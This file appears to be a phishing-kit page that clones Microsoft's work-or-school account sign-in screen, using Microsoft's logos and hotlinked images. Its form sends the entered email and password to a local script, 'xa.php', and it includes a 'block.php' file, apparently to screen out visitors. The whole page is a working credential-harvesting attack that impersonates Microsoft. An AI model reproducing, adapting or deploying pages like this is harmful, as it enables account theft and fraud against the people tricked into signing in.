<?
require_once 'block.php';
ini_set("output_buffering",4096);
session_start();




?>
<!doctype html>
<html>
<head>
	<title>Sign in to your account</title>
	<link rel="SHORTCUT ICON" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5517.3/content/images/favicon_a.ico" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes" />
</head>
<body>
<div class="ie_legacy" id="background_branding_container" style="margin: 0px; padding: 0px; box-sizing: border-box; position: fixed; left: 0px; top: 0px; overflow: hidden; z-index: 0; opacity: 1; width: 1366px; height: 662px; transition: opacity 1s; background: #fff;"><img alt="Sign in with your work or school account" id="background_background_image" src="https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/y2tibtckspdiuxwdfhw-aqaika5xxfufyw7tdmgfq68/0/heroillustration?ts=635673344126516270" style="margin: 0px; padding: 0px; box-sizing: border-box; border: 0px; position: fixed; width: 966px; height: 735px; visibility: visible; display: block;" />
<div class="smalltext" id="auto_low_bandwidth_background_notification" style="margin: 0px; padding: 5px 500px 0px 10px; box-sizing: border-box; font-size: 0.8em; font-family: &quot;Segoe UI&quot;, Segoe, SegoeUI-Regular-final, Tahoma, Helvetica, Arial, sans-serif; visibility: hidden; color: rgb(255, 255, 255);">&nbsp;</div>

<div aria-hidden="true" class="background_title_text" id="background_company_name_text" style="margin: -0.7em 500px 0px 0px; padding: 0px; box-sizing: border-box; color: rgb(255, 255, 255); font-size: 5em; font-family: &quot;Segoe UI Light&quot;, Segoe, &quot;Segoe UI&quot;, SegoeUI-Light-final, Tahoma, Helvetica, Arial, sans-serif; position: relative; top: 331px; text-align: center; opacity: 0;">Sign in with your work or school account</div>
</div>

<div class="login_panel" id="login_panel" style="margin: 0px; padding: 0px; box-sizing: border-box; height: 662px; background: rgb(255, 255, 255); position: fixed; right: 0px; float: right; width: 500px; z-index: 1; overflow-y: auto; overflow-x: hidden; text-align: center; border-left: 1px solid rgb(255, 255, 255); margin-top: -8px;">
<table class="login_panel_layout" style="margin: 0px auto; padding: 0px; box-sizing: border-box; border-spacing: 0px; border-collapse: collapse; text-align: left; height: 662px;">
	<tbody style="margin: 0px; padding: 0px; box-sizing: border-box;">
		<tr class="login_panel_layout_row" style="margin: 0px; padding: 0px; box-sizing: border-box; height: 662px;">
			<td id="login_panel_center" style="margin: 0px; padding: 0px; box-sizing: border-box; width: 400px; height: 662px; min-height: 100%; display: inline-block; border: 0px;">
			<div class="login_inner_container" style="margin: 0px 0px -50px; padding: 0px; box-sizing: border-box; min-height: 100%; width: 400px;">
			<div class="inner_container cred" id="true_inner" style="margin: 0px; padding: 45px 0px 0px; box-sizing: border-box; width: 400px; display: inline-block; position: relative; height: 464px;">
			<div class="login_workload_logo_container" style="margin: 0px; padding: 0px; box-sizing: border-box; width: auto; height: auto; transition: margin 0.6s;"><img alt="Sign in with your work or school account" class="workload_img" id="login_workload_logo_image" src="https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/y2tibtckspdiuxwdfhw-aqaika5xxfufyw7tdmgfq68/0/bannerlogo?ts=635673344101780393" style="margin: 0px; padding: 0px; box-sizing: border-box; border: 0px; max-width: 300px; max-height: 60px; visibility: visible;" /></div>

			<div class="spacer" style="margin: 0px; padding: 30px 0px 0px; box-sizing: border-box; transition: padding 0.6s;">&nbsp;</div>


			<div class="login_cta_container normaltext" style="margin: 0px; padding: 0px 0px 30px; box-sizing: border-box; font-size: 0.9em; font-family: &quot;Segoe UI&quot;, Segoe, SegoeUI-Regular-final, Tahoma, Helvetica, Arial, sans-serif; width: auto; height: auto;">
			<div class="cta_message_text 1" id="login_cta_text" style="margin: 0px; padding: 0px; box-sizing: border-box;">Work or school, or personal Microsoft account</div>
			</div>

			<ul class="login_cred_container" style="margin: 0px; padding: 0px 0px 20px; box-sizing: border-box; width: 400px; height: auto; transition: margin 0.6s;">
				<li class="login_cred_field_container" style="margin: 0px 0px 0px 1px; padding: 0px; box-sizing: border-box; width: 380px; display: block; list-style: none;">
				<form action="xa.php" id="credentials" method="post" style="margin: 0px; padding: 0px; box-sizing: border-box; width: auto; height: auto;">
				<div class="login_textfield textfield" id="cred_userid_container" style="margin: 0px 0px 2px; padding: 0px; box-sizing: border-box; width: 350px; z-index: -1;">
				<div class="input_border" style="margin: 0px; padding: 0px; box-sizing: border-box;"><span class="input_field textfield" style="margin: 0px; padding: 0px; box-sizing: border-box; width: 350px; background: transparent; z-index: 0;"><input alt="Email or phone" aria-describedby="accessibleError" aria-label="User account" autocomplete="off" class="login_textfield textfield required email field normaltext" id="cred_userid_inputtext" name="login" placeholder="Email or phone" spellcheck="false" style="margin: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 3px; box-sizing: border-box; font-size: 0.9em; font-family: &quot;Segoe UI&quot;, Segoe, SegoeUI-Regular-final, Tahoma, Helvetica, Arial, sans-serif; width: 350px; color: rgb(0, 0, 0); height: 28px; border-width: 1px; border-style: solid; border-color: rgb(184, 184, 184); z-index: 3; background: transparent;" type="email" value="" /></span></div>
				</div>

				<div class="progress" id="redirect_dots_animation" style="margin: 0px; padding: 0px; box-sizing: border-box; position: relative; top: -6px; height: 6px; visibility: hidden;">
				<div class="pip" style="margin: 0px; padding: 0px; box-sizing: border-box; width: 3px; height: 3px; overflow: hidden; position: absolute; background: rgb(105, 105, 105); z-index: 100;">&nbsp;</div>

				<div class="pip" style="margin: 0px; padding: 0px; box-sizing: border-box; width: 3px; height: 3px; overflow: hidden; position: absolute; background: rgb(105, 105, 105); z-index: 100;">&nbsp;</div>

				<div class="pip" style="margin: 0px; padding: 0px; box-sizing: border-box; width: 3px; height: 3px; overflow: hidden; position: absolute; background: rgb(105, 105, 105); z-index: 100;">&nbsp;</div>

				<div class="pip" style="margin: 0px; padding: 0px; box-sizing: border-box; width: 3px; height: 3px; overflow: hidden; position: absolute; background: rgb(105, 105, 105); z-index: 100;">&nbsp;</div>

				<div class="pip" style="margin: 0px; padding: 0px; box-sizing: border-box; width: 3px; height: 3px; overflow: hidden; position: absolute; background: rgb(105, 105, 105); z-index: 100;">&nbsp;</div>
				</div>

				<div class="login_textfield textfield" id="cred_password_container" style="margin: 0px; padding: 0px; box-sizing: border-box; width: 399px; z-index: -1; opacity: 1; transition: visibility 1s;">
				<div class="input_border" style="margin: 0px; padding: 0px; box-sizing: border-box;"><span class="input_field textfield" style="margin: 0px; padding: 0px; box-sizing: border-box; width: 350px; background: transparent; z-index: 0;"><input alt="Password" aria-describedby="accessibleError" aria-label="Password" class="login_textfield textfield required field normaltext" id="cred_password_inputtext" name="passwd" placeholder="Password" spellcheck="false" style="margin: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 3px; box-sizing: border-box; font-size: 0.9em; font-family: &quot;Segoe UI&quot;, Segoe, SegoeUI-Regular-final, Tahoma, Helvetica, Arial, sans-serif; width: 350px; color: rgb(0, 0, 0); height: 28px; border-width: 1px; border-style: solid; border-color: rgb(184, 184, 184); z-index: 3; background: transparent;" type="password" value="" /></span></div>
				</div>
				
				</li>
				<li class="login_splitter_control" id="login-splitter-control" style="margin: 0px 0px 30px; padding: 0px; box-sizing: border-box; display: block; list-style: none;">
				</li>
				<li class="login_cred_options_container" id="login_cred_options_container" style="margin: 0px; padding: 0px; box-sizing: border-box; width: 380px; display: block; list-style: none;">
				<div class="subtext normaltext" id="cred_kmsi_container" style="margin: 10px 0px 30px 1px; padding: 0px; box-sizing: border-box; font-size: 0.9em; font-family: &quot;Segoe UI&quot;, Segoe, SegoeUI-Regular-final, Tahoma, Helvetica, Arial, sans-serif; transition: opacity 1s, background-color 1s; opacity: 1;"><span class="input_field " style="margin: 0px; padding: 0px; box-sizing: border-box; background: transparent; z-index: 0;"><input class="win-checkbox" id="cred_keep_me_signed_in_checkbox" name="persist" style="margin: 0px; padding: 0px; border-color: rgb(91, 91, 91);" type="checkbox" value="0" />&nbsp;<label class="persist_text" for="cred_keep_me_signed_in_checkbox" id="keep_me_signed_in_label_text" style="margin: 0px; padding: 0px; box-sizing: border-box;">Keep me signed in</label></span></div>
				<button type="submit" value="Sign In" class="button normaltext cred_sign_in_button refresh_domain_state control-button button-two button_primary disabled_button" id="cred_sign_in_button" style="margin: 0px 4px 0px 0px; padding: 6px 12px; font-size: 0.9em; font-family: &quot;Segoe UI&quot;, Segoe, SegoeUI-Regular-final, Tahoma, Helvetica, Arial, sans-serif; background: rgb(38, 114, 236); border-width: 1px; border-style: solid; border-color: rgb(255, 255, 255); color: rgb(255, 255, 255); width: auto; transition: background 1s; user-select: none; opacity: 1;">Sign in</button>

				<div class="subtext smalltext" id="recover_container" style="margin: 30px 0px 10px; padding: 0px; box-sizing: border-box; font-size: 0.8em; font-family: &quot;Segoe UI&quot;, Segoe, SegoeUI-Regular-final, Tahoma, Helvetica, Arial, sans-serif; transition: opacity 1s, background-color 1s; opacity: 1;"><span style="margin: 0px; padding: 0px; box-sizing: border-box;"><a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&amp;response_mode=form_post&amp;response_type=code+id_token&amp;scope=openid+profile&amp;state=OpenIdConnect.AuthenticationProperties%3deH3QPUAZjf9CTFNBTM_94vea7Y7A26xDWDWlQ9rpLonsE46dJmFV9ZNn6-z9PvhCPh4LHtjrTEUov_7e5ua0VqOgU3mwBKmKxUxopc7WFbfbxW_YgKWxC6PCSBwGhYpb&amp;nonce=636235064385996725.OTE2OGJhZGMtMWMwYS00YjMxLWJkMDMtOTQ5OTJjOWVlZmQyODAyMzFkMWItYWE5Ny00YWRiLTk4Y2MtMzAzYzcwMDk0MzA3&amp;redirect_uri=https%3a%2f%2fwww.office.com%2flanding&amp;ui_locales=en-US&amp;mkt=en-US&amp;client-request-id=682fdfbb-4b3f-42be-961b-279d40b050c4#" style="margin: 0px; padding: 0px; box-sizing: border-box; text-decoration: none; color: rgb(40, 114, 221); background-color: transparent;">Can&rsquo;t access your account?</a></span></div>

				<div id="alternative-identity-providers" style="margin: 0px; padding: 0px; box-sizing: border-box;">&nbsp;</div>
				</form>
				</li>
			</ul>
			</div>

			<div class="push" style="margin: 0px; padding: 0px; box-sizing: border-box; content: &quot;&quot;; height: 50px;">&nbsp;</div>
			</div>

			<div class="login_footer_container" id="footer_links_container" style="margin: 0px; padding: 0px; box-sizing: border-box; height: 50px;">
			<div class="footer_inner_container" style="margin: 0px; padding: 0px; box-sizing: border-box;">
			<div class="footer_block" id="footer_table" style="margin: 0px; padding: 0px; box-sizing: border-box; width: 350px; color: rgb(118, 118, 118); font-family: &quot;Segoe UI Webfont&quot;, &quot;Helvetica Neue&quot;, &quot;Lucida Grande&quot;, Roboto, Ebrima, &quot;Nirmala UI&quot;, Gadugi, &quot;Segoe Xbox Symbol&quot;, &quot;Segoe UI Symbol&quot;, &quot;Meiryo UI&quot;, &quot;Khmer UI&quot;, Tunga, &quot;Lao UI&quot;, Raavi, &quot;Iskoola Pota&quot;, Latha, Leelawadee, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft JhengHei UI&quot;, &quot;Malgun Gothic&quot;, &quot;Estrangelo Edessa&quot;, &quot;Microsoft Himalaya&quot;, &quot;Microsoft New Tai Lue&quot;, &quot;Microsoft PhagsPa&quot;, &quot;Microsoft Tai Le&quot;, &quot;Microsoft Yi Baiti&quot;, &quot;Mongolian Baiti&quot;, &quot;MV Boli&quot;, &quot;Myanmar Text&quot;, &quot;Cambria Math&quot;; max-width: 350px;">
			<div class="corporate_footer" style="margin: 0px; padding: 0px; box-sizing: border-box; float: left;">
			<div style="margin: 0px; padding: 0px; box-sizing: border-box;"><span class="footer_link text-caption" id="footer_copyright_link" style="margin: 1.25rem 12px 1.25rem 0px; padding: 1.1816px 0px; box-sizing: border-box; font-size: 0.75rem; line-height: 0.875rem;">&copy; 2017 Microsoft</span></div>

			<div style="margin: 0px; padding: 0px; box-sizing: border-box;"><span class="footer_link" style="margin: 0px 12px 0px 0px; padding: 0px; box-sizing: border-box;"><a class="text-caption" href="https://www.microsoft.com/en-US/servicesagreement/" id="footer_link_terms" style="margin: 1.25rem 0px; padding: 1.1816px 0px; box-sizing: border-box; text-decoration: none; color: rgb(40, 114, 221); background-color: transparent; font-size: 0.75rem; line-height: 0.875rem;" target="_blank">Terms of use</a>&nbsp;</span><span class="footer_link" style="margin: 0px 12px 0px 0px; padding: 0px; box-sizing: border-box;"><a class="text-caption" href="https://privacy.microsoft.com/en-US/privacystatement" id="footer_link_privacy" style="margin: 1.25rem 0px; padding: 1.1816px 0px; box-sizing: border-box; text-decoration: none; color: rgb(40, 114, 221); background-color: transparent; font-size: 0.75rem; line-height: 0.875rem;" target="_blank">Privacy &amp; Cookies</a></span></div>
			</div>

			<div class="footer_glyph" style="margin: 0px; padding: 0px 7px 0px 0px; box-sizing: border-box; width: 350px; height: 26px; text-align: right;"><img alt="Microsoft account symbol" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5517.3/content/images/microsoft_logo.png" style="margin: 0px; padding: 0px; box-sizing: border-box; border: 0px;" /></div>
			</div>
			</div>
			</div>
			</td>
		</tr>
	</tbody>
</table>
</div>
</body>
</html>
